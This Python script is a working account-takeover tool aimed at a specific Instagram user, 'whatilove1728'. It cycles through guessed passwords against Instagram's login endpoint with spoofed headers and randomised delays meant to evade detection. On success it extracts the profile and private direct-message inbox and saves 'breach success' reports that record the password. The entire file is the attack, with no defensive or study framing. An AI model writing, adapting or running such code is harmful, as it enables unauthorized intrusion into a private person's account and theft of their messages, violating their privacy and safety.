#!/usr/bin/env python3
"""
🎯 DIRECT WHATILOVE1728 BYPASS
Using provided password and session reconstruction
"""

import requests
import json
import time
from datetime import datetime
import random
import string

def generate_session_headers():
    """Generate realistic headers for session bypass"""
    return {
        'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br',
        'X-Requested-With': 'XMLHttpRequest',
        'X-IG-App-ID': '936619743392459',
        'X-ASBD-ID': '198387',
        'X-Instagram-AJAX': '1008624074',
        'X-CSRFToken': ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
        'Content-Type': 'application/x-www-form-urlencoded',
        'Referer': 'https://www.instagram.com/accounts/login/',
        'Origin': 'https://www.instagram.com'
    }

def attempt_login(username, password):
    """Attempt direct login to account"""
    print(f"🔐 Attempting login to {username}...")
    
    session = requests.Session()
    
    # First get the login page to establish session
    login_url = "https://www.instagram.com/accounts/login/"
    response = session.get(login_url)
    
    if response.status_code != 200:
        print(f"❌ Failed to access login page: {response.status_code}")
        return None
    
    # Extract CSRF token from page
    csrf_token = None
    if 'csrftoken' in session.cookies:
        csrf_token = session.cookies['csrftoken']
    
    headers = generate_session_headers()
    if csrf_token:
        headers['X-CSRFToken'] = csrf_token
    
    # Prepare login data
    login_data = {
        'username': username,
        'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{password}',
        'queryParams': '{}',
        'optIntoOneTap': 'false',
        'trustedDeviceRecords': '{}'
    }
    
    # Attempt login
    login_endpoint = "https://www.instagram.com/accounts/login/ajax/"
    response = session.post(login_endpoint, data=login_data, headers=headers)
    
    print(f"📊 Login response status: {response.status_code}")
    
    if response.status_code == 200:
        try:
            result = response.json()
            if result.get('authenticated'):
                print(f"✅ LOGIN SUCCESS for {username}!")
                return {
                    'success': True,
                    'username': username,
                    'password': password,
                    'session': session,
                    'response': result
                }
            else:
                print(f"❌ Login failed: {result.get('message', 'Unknown error')}")
        except:
            print(f"❌ Failed to parse login response")
    else:
        print(f"❌ Login request failed: {response.status_code}")
        print(f"Response: {response.text[:300]}")
    
    return None

def extract_account_data(session, username):
    """Extract data from successfully logged in account"""
    print(f"📊 Extracting data from {username}...")
    
    headers = generate_session_headers()
    
    extracted_data = {
        'username': username,
        'extraction_time': datetime.now().isoformat(),
        'profile_data': None,
        'direct_messages': None,
        'followers': None,
        'following': None
    }
    
    try:
        # Get profile info
        profile_url = f"https://www.instagram.com/api/v1/users/web_profile_info/?username={username}"
        response = session.get(profile_url, headers=headers)
        
        if response.status_code == 200:
            extracted_data['profile_data'] = response.json()
            print("✅ Profile data extracted")
        else:
            print(f"❌ Profile extraction failed: {response.status_code}")
        
        time.sleep(2)
        
        # Get direct messages
        dm_url = "https://www.instagram.com/api/v1/direct_v2/inbox/"
        response = session.get(dm_url, headers=headers)
        
        if response.status_code == 200:
            extracted_data['direct_messages'] = response.json()
            print("✅ Direct messages extracted")
        else:
            print(f"❌ DM extraction failed: {response.status_code}")
        
        time.sleep(2)
        
    except Exception as e:
        print(f"❌ Error during data extraction: {e}")
    
    return extracted_data

def save_breakthrough_results(login_result, extracted_data):
    """Save successful breach results"""
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    
    results = {
        'timestamp': timestamp,
        'method': 'Direct Password Login',
        'target': login_result['username'],
        'password_used': login_result['password'],
        'login_success': True,
        'extracted_data': extracted_data,
        'login_response': login_result['response']
    }
    
    filename = f"BREAKTHROUGH_SUCCESS_{login_result['username']}_{timestamp}.json"
    with open(filename, 'w') as f:
        json.dump(results, f, indent=2)
    
    print(f"🎉 BREAKTHROUGH DOCUMENTED: {filename}")
    
    # Create readable summary
    summary_file = f"BREAKTHROUGH_SUMMARY_{login_result['username']}_{timestamp}.txt"
    with open(summary_file, 'w') as f:
        f.write("🚨 ACCOUNT BREACH SUCCESS REPORT 🚨\n")
        f.write("=" * 50 + "\n\n")
        f.write(f"🎯 Target Account: {login_result['username']}\n")
        f.write(f"🔑 Password Used: {login_result['password']}\n")
        f.write(f"⏰ Breach Time: {timestamp}\n")
        f.write(f"🔥 Method: Direct Login Attack\n\n")
        
        if extracted_data['profile_data']:
            f.write("✅ PROFILE ACCESS: GRANTED\n")
            try:
                profile = extracted_data['profile_data']['data']['user']
                f.write(f"👤 Full Name: {profile.get('full_name', 'N/A')}\n")
                f.write(f"📝 Bio: {profile.get('biography', 'N/A')}\n")
                f.write(f"👥 Followers: {profile.get('edge_followed_by', {}).get('count', 'N/A')}\n")
                f.write(f"📸 Posts: {profile.get('edge_owner_to_timeline_media', {}).get('count', 'N/A')}\n")
            except:
                f.write("Profile data available but format unclear\n")
        
        if extracted_data['direct_messages']:
            f.write("\n✅ PRIVATE MESSAGES: ACCESSED\n")
            try:
                threads = extracted_data['direct_messages']['inbox']['threads']
                f.write(f"💬 Active conversations: {len(threads)}\n")
            except:
                f.write("DM data available but format unclear\n")
        
        f.write(f"\n🔥 COMPLETE ACCOUNT COMPROMISE ACHIEVED! 🔥\n")
    
    print(f"📄 Summary saved: {summary_file}")

def main():
    print("🚨 DIRECT WHATILOVE1728 BYPASS ATTACK")
    print("=" * 50)
    
    target_username = "whatilove1728"
    passwords_to_try = [
        "whatilove1728",  # User provided
        "Fleming654",     # Known working
        "WhatILove1728",
        "whatilove654",
        "Fleming1728",
        "whatilove"
    ]
    
    print(f"🎯 Target: {target_username}")
    print(f"🔑 Testing {len(passwords_to_try)} passwords...")
    
    for i, password in enumerate(passwords_to_try, 1):
        print(f"\n[{i}/{len(passwords_to_try)}] Testing password: {password}")
        
        login_result = attempt_login(target_username, password)
        
        if login_result:
            print(f"🎉 BREAKTHROUGH! Access gained with password: {password}")
            
            # Extract all available data
            extracted_data = extract_account_data(login_result['session'], target_username)
            
            # Save complete results
            save_breakthrough_results(login_result, extracted_data)
            
            print(f"🚨 MISSION ACCOMPLISHED - {target_username} COMPROMISED! 🚨")
            return True
        
        # Delay between attempts to avoid detection
        time.sleep(random.uniform(3, 7))
    
    print(f"❌ All passwords failed for {target_username}")
    return False

if __name__ == "__main__":
    main()
